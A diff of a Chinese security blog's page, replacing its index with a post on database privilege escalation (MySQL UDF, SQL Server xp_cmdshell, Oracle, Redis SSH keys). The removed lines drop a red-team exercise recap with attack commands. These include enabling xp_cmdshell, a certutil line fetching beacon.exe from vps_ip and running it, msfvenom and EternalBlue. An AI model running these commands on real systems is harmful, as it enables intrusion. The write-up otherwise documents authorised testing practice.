@@ -20,28 +20,51 @@
     var CONFIG = {"hostname":"www.xn--jpru96amjlpmr.top","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
   </script>
 
-  <meta property="og:type" content="website">
-<meta property="og:title" content="可爱挺萌">
-<meta property="og:url" content="https://www.可爱挺萌.top/index.html">
+  <meta name="description" content="在hw时常常能从配置文件中获得一些数据库的账号密码，然后就可以尝试利用数据库运行系统命令达到上线等目的。 0x01 mysql的udf提权1 前提1.select @@secure_file_priv secure_file_priv参数值表示有导入导出权限的路径 为空或为需要操作文件夹的父目录。 如果该参数为空（不是null），则表示可以向任何目录写操作 2.数据库版本不同，udf.dll放置目">
+<meta property="og:type" content="article">
+<meta property="og:title" content="数据库提权合集">
+<meta property="og:url" content="https://www.可爱挺萌.top/2021/04/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%90%88%E9%9B%86/index.html">
 <meta property="og:site_name" content="可爱挺萌">
+<meta property="og:description" content="在hw时常常能从配置文件中获得一些数据库的账号密码，然后就可以尝试利用数据库运行系统命令达到上线等目的。 0x01 mysql的udf提权1 前提1.select @@secure_file_priv secure_file_priv参数值表示有导入导出权限的路径 为空或为需要操作文件夹的父目录。 如果该参数为空（不是null），则表示可以向任何目录写操作 2.数据库版本不同，udf.dll放置目">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404005918.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010108.png">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010210.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010235.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010249.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010300.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010329.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406195446.png">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010350.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010412.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404010443.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213502.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213507.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406213403.PNG">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406215958.png">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406220232.png">
+<meta property="og:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406220343.png">
+<meta property="article:published_time" content="2021-04-03T10:32:53.000Z">
+<meta property="article:modified_time" content="2021-04-06T14:06:14.674Z">
 <meta property="article:author" content="keaitm">
+<meta property="article:tag" content="上线">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210404005918.PNG">
 
-<link rel="canonical" href="https://www.可爱挺萌.top/">
+<link rel="canonical" href="https://www.可爱挺萌.top/2021/04/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%90%88%E9%9B%86/">
 
 
 <script id="page-configurations">
   // https://hexo.io/docs/variables.html
   CONFIG.page = {
     sidebar: "",
-    isHome : true,
-    isPost : false,
+    isHome : false,
+    isPost : true,
     lang   : 'zh-CN'
   };
 </script>
 
-  <title>可爱挺萌</title>
+  <title>数据库提权合集 | 可爱挺萌</title>
   
 
 
@@ -140,9 +163,10 @@
         <div class="content-wrap">
           
 
-          <div class="content index posts-expand">
+          <div class="content post posts-expand">
             
-      
+
+    
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
@@ -158,10 +182,9 @@
       <meta itemprop="name" content="可爱挺萌">
     </span>
       <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/04/03/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%8F%90%E6%9D%83%E5%90%88%E9%9B%86/" class="post-title-link" itemprop="url">数据库提权合集</a>
-        </h2>
+        <h1 class="post-title" itemprop="name headline">
+          数据库提权合集
+        </h1>
 
         <div class="post-meta">
             <span class="post-meta-item">
@@ -191,7 +214,7 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <p><strong>在hw时常常能从配置文件中获得一些数据库的账号密码，然后就可以尝试利用数据库运行系统命令达到上线等目的。</strong></p>
+        <p><strong>在hw时常常能从配置文件中获得一些数据库的账号密码，然后就可以尝试利用数据库运行系统命令达到上线等目的。</strong></p>
 <h2 id="0x01-mysql的udf提权"><a href="#0x01-mysql的udf提权" class="headerlink" title="0x01 mysql的udf提权"></a>0x01 mysql的udf提权</h2><h4 id="1-前提"><a href="#1-前提" class="headerlink" title="1 前提"></a>1 前提</h4><p>1.<code>select @@secure_file_priv</code></p>
 <p>secure_file_priv参数值表示有导入导出权限的路径</p>
 <p>为空或为需要操作文件夹的父目录。</p>
@@ -303,221 +326,33 @@
 <p><img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210406220343.png" alt="ssh"></p>
 <p>成功，开始为所欲为。</p>
 
-      
     </div>
 
     
     
     
+
       <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
+          <div class="post-tags">
+              <a href="/tags/%E4%B8%8A%E7%BA%BF/" rel="tag"># 上线</a>
+          </div>
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.可爱挺萌.top/2021/03/20/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1hvv%E6%8B%89%E4%BA%86%E6%BB%A1%E6%BB%A1%E4%B8%80%E5%BA%93/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="keaitm">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="可爱挺萌">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/20/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1hvv%E6%8B%89%E4%BA%86%E6%BB%A1%E6%BB%A1%E4%B8%80%E5%BA%93/" class="post-title-link" itemprop="url">记录第一次hvv拉了满满一库</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-20 18:38:33" itemprop="dateCreated datePublished" datetime="2021-03-20T18:38:33+08:00">2021-03-20</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-03-21 14:48:18" itemprop="dateModified" datetime="2021-03-21T14:48:18+08:00">2021-03-21</time>
-              </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>​    <code>3月19日终于回家了，在jx打了五天半的hvv，第一次实战，总结一下。</code></p>
-<h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>​    记录一下==大陆彭法师==赛前教我的信息收集方法(从主域名出发)：</p>
-<pre><code>###     1.1 icp备案查询
-</code></pre>
-<p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn/#/Integrated/recordQuery"><em>ICP</em>/IP地址/域名信息备案管理系统</a></p>
-<p>​        <img src="https://gitee.com/lovely_sprout/image/raw/master/tupian/20210320192000.png" alt="image-20210320191823236"></p>
-<p>​        搜索域名后，根据主办单位和网站备案号，继续查询该域名相关域名。</p>
-<p>​        </p>
-<p>​        </p>
-<h3 id="1-2-子域名收集"><a href="#1-2-子域名收集" class="headerlink" title="1.2 子域名收集"></a>1.2 子域名收集</h3><h4 id="1-2-1-搜索引擎（用法之后单开一章）"><a href="#1-2-1-搜索引擎（用法之后单开一章）" class="headerlink" title="1.2.1 搜索引擎（用法之后单开一章）"></a>1.2.1 搜索引擎（用法之后单开一章）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1.google,baidu等搜索引擎   语法:site:baidu.com、……</span><br><span class="line">2.fofa，zoomeye等网络空间测绘工具  </span><br><span class="line">	fofa https:&#x2F;&#x2F;fofa.so&#x2F;</span><br><span class="line">	zoomeye https:&#x2F;&#x2F;www.zoomeye.org&#x2F;</span><br><span class="line">	censys https:&#x2F;&#x2F;censys.io&#x2F;</span><br><span class="line">	shodan https:&#x2F;&#x2F;www.oshadan.com&#x2F;</span><br><span class="line">	国产傻蛋 https:&#x2F;&#x2F;www.shodan.io&#x2F;</span><br></pre></td></tr></table></figure>
+        
 
 
-
-<h4 id="1-2-2子域名查询工具"><a href="#1-2-2子域名查询工具" class="headerlink" title="1.2.2子域名查询工具"></a>1.2.2子域名查询工具</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Layer子域名挖掘机</span><br><span class="line">wydomain  https:&#x2F;&#x2F;github.com&#x2F;ring04h&#x2F;wydomain    </span><br><span class="line">subDomainsBrute  https:&#x2F;&#x2F;github.com&#x2F;lijiejie&#x2F;</span><br><span class="line">oneforall  https:&#x2F;&#x2F;github.com&#x2F;shmilylty&#x2F;OneForAll</span><br></pre></td></tr></table></figure>
-
-
-
-<h4 id="1-2-3其他方法"><a href="#1-2-3其他方法" class="headerlink" title="1.2.3其他方法"></a>1.2.3其他方法</h4><p>​            dns爆破、ssl/https证书查询等、ip反查dns。</p>
-<h3 id="1-3目标相关收集"><a href="#1-3目标相关收集" class="headerlink" title="1.3目标相关收集"></a>1.3目标相关收集</h3><h4 id="1-3-1在线方式"><a href="#1-3-1在线方式" class="headerlink" title="1.3.1在线方式"></a>1.3.1在线方式</h4><p>​        这次主要用了fofa，因为有高级会员：</p>
-<p>​        a.ip查询同服务器服务</p>
-<p>​        b.查询title，body关键词</p>
-<p>​        c.同单位网段可能是连号  11.11.11.0/24 网段查询</p>
-<p>​        d.直接查域名</p>
-<p>​        e.点网站图标</p>
-<h4 id="1-3-2其他"><a href="#1-3-2其他" class="headerlink" title="1.3.2其他"></a>1.3.2其他</h4><p>​        a.1-65535端口扫描，一个个看</p>
-<p>​        b.网站可能使用了某种存在漏洞的框架、 系统 如：低版本的weblogic、致远oa等</p>
-<p>​        c.whois查询</p>
-<h3 id="1-4单站点信息"><a href="#1-4单站点信息" class="headerlink" title="1.4单站点信息"></a>1.4单站点信息</h3><h4 id="1-4-1-真实ip查询"><a href="#1-4-1-真实ip查询" class="headerlink" title="1.4.1 真实ip查询"></a>1.4.1 真实ip查询</h4><p>​        全球ping、邮件、旁站子站、若不久上的cdn直接dns可能能查到。</p>
-<h4 id="1-4-2目录扫描、敏感信息泄露"><a href="#1-4-2目录扫描、敏感信息泄露" class="headerlink" title="1.4.2目录扫描、敏感信息泄露"></a>1.4.2目录扫描、敏感信息泄露</h4><p>​        员工个人信息、waf、登陆点、后台、历史未删除页面、物理路径、源码备份、可用于社工的信息泄露。</p>
-<h3 id="1-5下级单位信息搜集"><a href="#1-5下级单位信息搜集" class="headerlink" title="1.5下级单位信息搜集"></a>1.5下级单位信息搜集</h3><p>​    如政府部门下属部门，大公司的子公司</p>
-<h2 id="2-文件上传"><a href="#2-文件上传" class="headerlink" title="2.文件上传"></a>2.文件上传</h2><p>记录一下遇到的文件上传</p>
-<h3 id="2-1-前端校验后缀，后段校验文件内图片特征"><a href="#2-1-前端校验后缀，后段校验文件内图片特征" class="headerlink" title="2.1 前端校验后缀，后段校验文件内图片特征"></a>2.1 前端校验后缀，后段校验文件内图片特征</h3><p>制作图片马，木马代码段位于图片乱码之后，bp抓包上传</p>
-<h3 id="2-2数据库上传"><a href="#2-2数据库上传" class="headerlink" title="2.2数据库上传"></a>2.2数据库上传</h3><p>遇到了sql server，找到了几台的用户/密码，==剑仙==教的开xp_cmdshell，下马上线：</p>
-<p>1、开启xp_cmdshell：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sp_configure <span class="string">&#x27;show advanced options&#x27;</span>,<span class="number">1</span></span><br><span class="line">reconfigure</span><br><span class="line">go</span><br><span class="line">sp_configure <span class="string">&#x27;xp_cmdshell&#x27;</span>,<span class="number">1</span></span><br><span class="line">reconfigure</span><br><span class="line">go</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、服务器开http服务，数据库下马：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">8000</span></span><br></pre></td></tr></table></figure>
-
-
-
-<p>3、数据库执行xp_cmdshell，下马上线：</p>
-<p>下载到有权限的文件夹，执行：</p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell &quot;certutil.exe -urlcache -split -f http://vps_ip:vps_port/beacon.exe c:\temp\a.exe&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">exec</span> xp_cmdshell <span class="string">&#x27;c:\temp\a.exe&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>成功即上线。</p>
-<h2 id="3-内网"><a href="#3-内网" class="headerlink" title="3.内网"></a>3.内网</h2><h3 id="3-1msf"><a href="#3-1msf" class="headerlink" title="3.1msf"></a>3.1msf</h3><p>1、msfvenom</p>
-<p><code> msfvenom -p payload -a 架构 --platform 平台 lhost=vps_ip port=vps_port -f 格式 -o 文件名 -e 编码</code></p>
-<p>1、autoroute</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;&gt; autoroute -s 11.11.11.0&#x2F;24 &#x2F;&#x2F;获得一个相当于内网代理的路由</span><br><span class="line"></span><br><span class="line">-p  &#x2F;&#x2F;查看路由配置</span><br><span class="line">-d -s 11.11.11.0&#x2F;24  &#x2F;&#x2F;删除该网段路由</span><br><span class="line"></span><br><span class="line">meterpreter&gt;&gt; background  &#x2F;&#x2F;session 放到后台</span><br></pre></td></tr></table></figure>
-
-
-
-<p>2、portscan</p>
-<p>3、ms17_010</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
-
-<p>设置rhosts就能用了，用之前建议扫一扫</p>
-<p><code>use auxiliary/scanner/smb/smb_ms17_010</code></p>
-<p>4、portfwd</p>
-<p><code> meterpreter&gt;&gt; portfwd add -l 本机监听 -p 目标端口 -r 目标ip</code></p>
-<p>直接访问原本无法访问的目标机端口</p>
-
-      
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/03/20/%E8%AE%B0%E5%BD%95%E7%AC%AC%E4%B8%80%E6%AC%A1hvv%E6%8B%89%E4%BA%86%E6%BB%A1%E6%BB%A1%E4%B8%80%E5%BA%93/" rel="prev" title="记录第一次hvv拉了满满一库">
+      <i class="fa fa-chevron-left"></i> 记录第一次hvv拉了满满一库
+    </a></div>
+      <div class="post-nav-item"></div>
     </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
       </footer>
+    
   </article>
   
   
-  
-
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="https://www.可爱挺萌.top/2021/03/20/hello-world/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="keaitm">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="可爱挺萌">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2021/03/20/hello-world/" class="post-title-link" itemprop="url">Hello World</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2021-03-20 15:50:56" itemprop="dateCreated datePublished" datetime="2021-03-20T15:50:56+08:00">2021-03-20</time>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
-
   
 
 
@@ -570,6 +405,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-mysql%E7%9A%84udf%E6%8F%90%E6%9D%83"><span class="nav-number">1.</span> <span class="nav-text">0x01 mysql的udf提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%89%8D%E6%8F%90"><span class="nav-number">1.0.1.</span> <span class="nav-text">1 前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%80%E6%B7%A6"><span class="nav-number">1.0.2.</span> <span class="nav-text">2 开淦</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-SQL-Server%E7%9A%84xp-cmdshell"><span class="nav-number">2.</span> <span class="nav-text">0x02 SQL Server的xp_cmdshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%89%8D%E6%8F%90-1"><span class="nav-number">2.0.1.</span> <span class="nav-text">1 前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%80%E6%B7%A6-1"><span class="nav-number">2.0.2.</span> <span class="nav-text">2 开淦</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%A4%E7%BB%99%E4%BD%A0%E4%BA%86%EF%BC%8C%E5%B3%B0"><span class="nav-number"></span> <span class="nav-text">&#x3D;&#x3D;交给你了，峰&#x3D;&#x3D;</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-oracle%E7%9A%84DBMS-EXPORT-EXTENSION-%E6%BC%8F%E6%B4%9E"><span class="nav-number">1.</span> <span class="nav-text">0x03 oracle的DBMS_EXPORT_EXTENSION()漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%89%8D%E6%8F%90-2"><span class="nav-number">1.0.1.</span> <span class="nav-text">1 前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%80%E6%B7%A6-2"><span class="nav-number">1.0.2.</span> <span class="nav-text">2 开淦</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AEredis%E5%88%A9%E7%94%A8SSH-key"><span class="nav-number">2.</span> <span class="nav-text">0x04 未授权访问redis利用SSH key</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%89%8D%E6%8F%90-3"><span class="nav-number">2.0.1.</span> <span class="nav-text">1 前提</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E5%BC%80%E6%B7%A6-3"><span class="nav-number">2.0.2.</span> <span class="nav-text">2 开淦</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
